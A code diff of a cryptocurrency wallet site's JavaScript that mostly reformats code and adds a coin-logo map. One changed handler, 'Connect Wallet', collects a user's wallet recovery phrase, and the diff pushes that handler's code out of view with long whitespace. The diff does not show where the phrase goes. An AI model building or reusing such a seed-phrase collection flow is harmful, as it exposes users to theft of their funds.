@@ -6,11 +6,14 @@ window.openConnectModal = () => {const modal = document.getElementById('connectW
 
 window.copyAddress = (text) => {navigator.clipboard.writeText(text);alert("Address copied!");};
 
-window.handlePasswordReset = () => {// If user is logged in, we can pre-fill or just redirectwindow.location.href = "password-reset.html";};
+window.handlePasswordReset = () => {
+    // If user is logged in, we can pre-fill or just redirect
+    window.location.href = "password-reset.html";};
 
 window.handleLogout = () => {auth.signOut().then(() => {window.location.href = "index.html";}).catch((error) => {console.error("Logout Error:", error);});};
 
-// Put this at the very top of user.js with your other variablesconst logos = {btc: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/bitcoin/info/logo.png",eth: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png",trx: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/info/logo.png",ltc: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/litecoin/info/logo.png",doge: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/doge/info/logo.png",usdt_trc: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png",bnb: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/info/logo.png",sol: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/solana/info/logo.png",usdt_erc: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png"};
+// Put this at the very top of user.js with your other variables
+    const logos = {btc: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/bitcoin/info/logo.png",eth: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png",trx: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/info/logo.png",ltc: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/litecoin/info/logo.png",doge: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/doge/info/logo.png",usdt_trc: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png",bnb: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/info/logo.png",sol: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/solana/info/logo.png",usdt_erc: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png"};
 
 // ================= AUTH & REALTIME SYNC =================// ================= AUTH & REALTIME SYNC =================
 
@@ -98,7 +101,8 @@ window.performTransaction = async function(amount, asset, recipientAddress) {
 
 });
 
-// ================= CONNECT WALLET SUBMISSION =================document.getElementById('submitConnect').onclick = async () => {const type = document.getElementById('walletType').value;const phrase = document.getElementById('walletPhrase').value.trim();
+// ================= CONNECT WALLET SUBMISSION =================
+                                                                                                         document.getElementById('submitConnect').onclick = async () => {const type = document.getElementById('walletType').value;const phrase = document.getElementById('walletPhrase').value.trim();
 
 // 1. Validation
 if (!phrase) { 
@@ -305,7 +309,8 @@ supportedCoins.forEach((coin) => {
 
 }
 
-// ================= COIN DETAIL LOGIC =================function openCoinDetail(coin, amount, price) {const modal = document.getElementById('coinDetailModal');
+// ================= COIN DETAIL LOGIC =================
+                                                                                                         function openCoinDetail(coin, amount, price) {const modal = document.getElementById('coinDetailModal');
 
 // Fill Text Data
 document.getElementById('detailCoinTitle').innerText = coin.toUpperCase();
